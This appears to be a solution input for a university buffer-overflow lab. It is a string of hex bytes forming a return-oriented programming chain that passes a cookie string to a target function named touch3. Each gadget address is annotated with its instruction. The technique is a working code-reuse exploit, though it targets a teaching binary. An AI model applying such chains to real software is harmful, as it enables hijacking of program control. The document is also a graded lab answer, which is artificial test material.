00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
ab 19 40 00 00 00 00 00    /* popq %rax */
20 00 00 00 00 00 00 00
dd 19 40 00 00 00 00 00    /* movl %eax,%edx */
69 1a 40 00 00 00 00 00    /* movq %rdx,%rcx */
27 1a 40 00 00 00 00 00    /* movq %rcx,%rsi */
06 1a 40 00 00 00 00 00    /* movq %rsp,%rax */
a2 19 40 00 00 00 00 00    /* movq %rax,%rdi */
d6 19 40 00 00 00 00 00    /* lea (%rdi,%rsi,1),%rax */
a2 19 40 00 00 00 00 00    /* movq %rax,%rdi */
fa 18 40 00 00 00 00 00    /* TOUCH3 */
35 39 62 39 39 37 66 61
00 00 00 00 00 00 00 00
